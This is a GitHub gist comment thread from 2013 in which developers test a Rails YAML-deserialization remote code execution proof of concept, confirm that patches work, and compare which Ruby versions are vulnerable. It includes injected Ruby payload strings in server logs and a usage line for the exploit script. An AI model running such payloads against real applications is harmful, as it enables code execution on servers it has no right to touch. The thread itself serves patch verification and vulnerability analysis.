+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-715366">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-715366">
+              <a href="/4499206/#comment-715366">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-715366">
+              <a href="/4499206/#comment-715366" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T15:46:37Z" datetime="2013-01-10T15:46:37Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Can someone explain what has to happen on the server-side to make this exploit work? I have tried executing it against a production 3.2.9 app and with the "puts 'lol'" code to execute and nothing shows up on my logs. My goal is to see the exploit work, update the app to mitigate the problem, then run again to verify it is no longer exploitable.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/0a81e3606ad8945bea745b48a3e66882?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716232">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/mjbellantoni" class="comment-header-author">mjbellantoni</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716232">
+              <a href="/4499206/#comment-716232">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716232">
+              <a href="/4499206/#comment-716232" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T18:10:55Z" datetime="2013-01-10T18:10:55Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>I had to modify this code slightly.  I removed the <code>x_http_method_override</code>.  Also, I did not see the Ruby code execute in either instance.  Here's what I saw in my server logs.</p>
+
+<p><strong>Unpatched Server</strong></p>
+
+<pre><code>Started POST "/items" for 127.0.0.1 at 2013-01-10 12:55:34 -0500
+  Processing by ItemsController#create as */*
+  Parameters: {"exploit"=&gt;#&lt;ActionDispatch::Routing::RouteSet::NamedRouteCollection:0x007ffa1225a148&gt;}
+</code></pre>
+
+<p><strong>Patched Server</strong></p>
+
+<pre><code>Started POST "/items" for 127.0.0.1 at 2013-01-10 12:56:14 -0500
+  Processing by ItemsController#create as */*
+  Parameters: {}
+</code></pre>
+
+<p>My changes are here: <a href="https://gist.github.com/4504388">https://gist.github.com/4504388</a></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/0d8bf3bd27189d1bba8365d532204dbb?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716252">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/cairo140" class="comment-header-author">cairo140</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716252">
+              <a href="/4499206/#comment-716252">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716252">
+              <a href="/4499206/#comment-716252" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T18:24:05Z" datetime="2013-01-10T18:24:05Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> you may be running your server in a way that doesn't capture stdout. Inject something like <code>File.open('/tmp/foo') {|f| f.write('bar')}</code>.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716747">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716747">
+              <a href="/4499206/#comment-716747">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716747">
+              <a href="/4499206/#comment-716747" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T22:57:10Z" datetime="2013-01-10T22:57:10Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Still no luck. I tried using the Rails logger to write to the log file. I also tried just creating a new file like <a href="/cairo140" class="user-mention">@cairo140</a> suggested. Here is what I see in my log:</p>
+
+<pre><code>Started GET "/home" for 76.20.208.70 at 2013-01-10 16:54:11 -0600
+Processing by PagesController#show as */*
+  Parameters: {"exploit"=&gt;{"foo; open('/tmp/exploit.txt') {|f| f.write('success')}\n__END__\n"=&gt;#&lt;OpenStruct defaults={:action=&gt;"create", :controller=&gt;"foos"}, required_parts=[], requirements={:action=&gt;"create", :controller=&gt;"foos"}, segment_keys=[:format]&gt;}, "id"=&gt;12}
+[....snip logs not relevant....]
+Completed 200 OK in 53ms (Views: 41.3ms | ActiveRecord: 2.2ms)
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/235c58ad566abb4c7979bc7033e9882c?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716751">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/dgm" class="comment-header-author">dgm</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716751">
+              <a href="/4499206/#comment-716751">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716751">
+              <a href="/4499206/#comment-716751" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T23:03:33Z" datetime="2013-01-10T23:03:33Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>The example in this gist does not match the current edit.... and I cannot get a successful test.   I would think another bit of code to run would be 'Rails.logger.debug "OUCH"'</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716827">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716827">
+              <a href="/4499206/#comment-716827">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716827">
+              <a href="/4499206/#comment-716827" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T00:42:48Z" datetime="2013-01-11T00:42:48Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/mjbellantoni" class="user-mention">@mjbellantoni</a> turns out <a href="https://github.com/ronin-ruby/ronin-support">ronin-support</a> <a href="https://github.com/ronin-ruby/ronin-support/blob/master/lib/ronin/network/http/http.rb#L288-L332">HTTP.request</a> will not send a body if <code>Net::HTTPRequest#request_body_permitted?</code> returns false; this has been fixed in <a href="https://github.com/ronin-ruby/ronin-support/commit/c2c27b820abffb5de6529bc7b0b8a641baacb372">master</a>. So a <code>POST</code> and <code>X-Http-Method-Override</code> are required. Your first example output looks correct. The output of the injected code should appear just above the Rails Request logging output.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716831">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716831">
+              <a href="/4499206/#comment-716831">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716831">
+              <a href="/4499206/#comment-716831" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T00:46:54Z" datetime="2013-01-11T00:46:54Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> Checkout the lengthy <a href="http://ronin-ruby.github.com/blog/2013/01/09/rails-pocs.html">write up</a>. I tested the exploit against a Rails 3.2.9 app, but in development mode. Perhaps check the production log files? However, your example output looks incorrect, it should contain an <code>ActionDispatch::Routing::RouteSet::NamedRouteCollection</code> object. Is this app running on Ruby 1.8?</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-716993">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716993">
+              <a href="/4499206/#comment-716993">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716993">
+              <a href="/4499206/#comment-716993" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T03:33:01Z" datetime="2013-01-11T03:33:01Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/postmodern" class="user-mention">@postmodern</a> - I figured out why your exploit did not work for me. My Rails application is running Ruby 1.9.2 which ships with Psych 1.0.0. This version of Psych is not as magical. It will serialize into arbitrary classes for Object, String and Exception. But you always got a plain Hash object from Psych until <a href="https://github.com/tenderlove/psych/issues/14">this pull request</a>. So if your app is running on Ruby 1.9.2 you are not AS vulnerable although I am sure a crafty person could come up with a similar exploit that serializes a subclass of Object, String or Exception and figures out how to execute code on that object.</p>
+
+<p>One thing I am wondering. Since all this depends on YAML serialization of ruby objects, and since Ruby 1.8.x shipped with Syck instead of Psych. Is it as vulnerable? I took a quick look at the code and I don't think it is. All objects that can be deserialized are explicity declared and there is not magic deserialization of sub-classes. Would love someone who is better with security to confirm that. If that is the case then does that means any Rails app on 1.8 is not vulnerable. I know a lot of people have moved to 1.9 but if 1.8 is safe then that significantly cuts down on the number of apps that need to be patched.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-718470">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-718470">
+              <a href="/4499206/#comment-718470">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-718470">
+              <a href="/4499206/#comment-718470" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T17:36:20Z" datetime="2013-01-11T17:36:20Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Just to followup. I did a bit more testing and Ruby 1.8 is indeed vulnerable to some of your POC scripts, but not this one for the same reason as Ruby 1.9.2. This script depends on the fact that you can unserialize any hash-like object via the ruby/hash tag. Ruby 1.9.2 and Ruby 1.8 BOTH do not allow this. You will always get back a plain Hash.</p>
+
+<p>From what I can tell your symbol DOS POC would still be effective on Ruby 1.8 and Ruby 1.9.2. Also your SQL Injection should still be effective since Arel::Nodes::SqlLiteral inherits from String. Ruby 1.8 and 1.9.2 won't allow a ruby/string to be an arbitrary class. But any subclass of String (like SqlLiteral) will work.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-719255">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-719255">
+              <a href="/4499206/#comment-719255">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-719255">
+              <a href="/4499206/#comment-719255" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-12T02:07:45Z" datetime="2013-01-12T02:07:45Z">2013-01-12</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> Excellent findings! I will update the blog post.</p>
+
+<p>I have also refactored the exploit to support both Rails 2 and 3. It turns out both Rails 2 and 3 provide a <code>ActionController::Routing::RouteSet::NamedRouteCollection</code> constant for backwards compatibility. However, the helper code that is evaluated is slightly different, so I had to require the user specify the version of Rails they wish to exploit. </p>
+
+<h3>Rails 2</h3>
+
+<pre><code>          def #{selector}(options = nil)
+            options ? #{options.inspect}.merge(options) : #{options.inspect}
+          end
+          protected :#{selector}
+</code></pre>
+
+<h3>Rails 3</h3>
+
+<pre><code>          remove_possible_method :#{selector}
+          def #{selector}(*args)
+            options = args.extract_options!
+            result = #{options.inspect}
+
+            if args.size &gt; 0
+              result[:_positional_args] = args
+              result[:_positional_keys] = #{route.segment_keys.inspect}
+            end
+
+            result.merge(options)
+          end
+          protected :#{selector}
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-719277">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-719277">
+              <a href="/4499206/#comment-719277">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-719277">
+              <a href="/4499206/#comment-719277" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-12T02:29:55Z" datetime="2013-01-12T02:29:55Z">2013-01-12</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> Just installed Ruby 1.9.2-p320 and can confirm Rails 2.x and 3.x are not vulnerable to the RCE exploit.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/dcfde00ac1fae8b575b2f9b39c7e244b?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-719738">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/bsodmike" class="comment-header-author">bsodmike</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-719738">
+              <a href="/4499206/#comment-719738">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-719738">
+              <a href="/4499206/#comment-719738" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-12T10:22:22Z" datetime="2013-01-12T10:22:22Z">2013-01-12</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>You need to correct the documentation above, as you're also specifying the param 'secret' in there; from what I can see this is not needed for this exploit although was used in the SQL (AREL) injection attack.</p>
+
+<p><code>#   $ rails_rce.rb http://localhost:3000/secrets/search "puts 'lol'" rails3</code></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-721219">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-721219">
+              <a href="/4499206/#comment-721219">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-721219">
+              <a href="/4499206/#comment-721219" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-13T06:10:58Z" datetime="2013-01-13T06:10:58Z">2013-01-13</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/bsodmike" class="user-mention">@bsodmike</a> good eyes. Fixed.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+    </div>
+      <form action="/4499206/comments"
+      class="js-comment-form"
+      data-pjax-remote=replace method="post" accept-charset="UTF-8">
+  <input name="authenticity_token" type="hidden" value="O/3kfhayIVeRDs0rV1MQCTbKxmD8kJ43doCmG0Ev+zY=" />
+
+  <div class="discussion-bubble">
+    <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/2d294fa145fd71d028923b2615334715?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+    <div class="discussion-bubble-content bubble">
+      <div class="discussion-bubble-inner">
+
+        <div class="js-previewable-comment-form previewable-comment-form write-selected" data-preview-url="/preview">
+          <div class="comment-form-head tabnav">
+            <ul class="js-preview-tabs tabnav-tabs">
+              <li><a href="#" class="tabnav-tab js-write-tab write-tab selected" action="write">Write</a></li>
+              <li><a href="#" class="tabnav-tab js-preview-tab preview-tab" action="preview">Preview</a></li>
+            </ul>
+            <span class="tabnav-right">
+              <span class="tabnav-widget text">
+                Comments are parsed with <a href="http://github.github.com/github-flavored-markdown/" class="gfm-help" target="_blank">GitHub Flavored Markdown</a>
+              </span>
+            </span>
+          </div>
+
+          <div class="comment-form-error" style="display: none;">There has been an error.</div>
+
+          <div class="tab-content write-content js-write-content">
+            <div class="textarea-frame">
+              <textarea name="comment[body]" placeholder="Leave a comment" class="js-comment-field js-size-to-fit"></textarea>
+            </div>
+          </div>
+
+          <div class="tab-content preview-content">
+            <div class="comment">
+              <div class="comment-header normal-comment-header">
+                <img class="comment-header-gravatar" width="22" height="22" src="https://secure.gravatar.com/avatar/2d294fa145fd71d028923b2615334715?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+                <a href="#" class="comment-header-author">andrewconner</a>
+                <span class="comment-header-action-text"><a href="#">commented</a></span>
+                <span class="comment-header-right">
+                  <a href="#" class="comment-header-date"><time>just now</time></a>
+                </span>
+              </div>
+              <div class="comment-content">
+                <div class="edit-comment-hide">
+                  <div class="comment-body markdown-body markdown-format preview-content-body js-preview-content">
+                    <p>Nothing to preview</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="form-actions">
+    <button class="classy primary js-comment-submit" type="submit">Add Comment</button>
+  </div>
+</form>
+
+  </div>
+</div>
+
+  <div class="context-overlay"></div>
+</div>
+
+    </div>
+    <div class="slow-loading-overlay"></div>
+  </div>
+
+  <div id="ajax-error-message" class="flash flash-error">
+    <div class="container">
+      <span class="mini-icon mini-icon-exclamation"></span>
+      Something went wrong with that request. Please try again.
+      <a href="#" class="mini-icon mini-icon-remove-close ajax-error-dismiss"></a>
+    </div>
+  </div>
+
+  <footer>
+    <div id="footer">
+  <div class="container clearfix">
+
+    <p class="right">&copy; 2013 GitHub Inc. All rights reserved.</p>
+    <a class="left" href="/">
+      <span class="mega-icon mega-icon-invertocat"></span>
+    </a>
+    <ul id="legal">
+      <li><a href="http://github.com/blog">The GitHub Blog</a></li>
+      <li><a href="mailto:support@github.com">Support</a></li>
+      <li><a href="https://github.com/contact">Contact</a></li>
+    </ul>
+
+  </div><!-- /.container -->
+</div><!-- /.#footer -->
+
+  </footer>
+
+</body>
+</html>
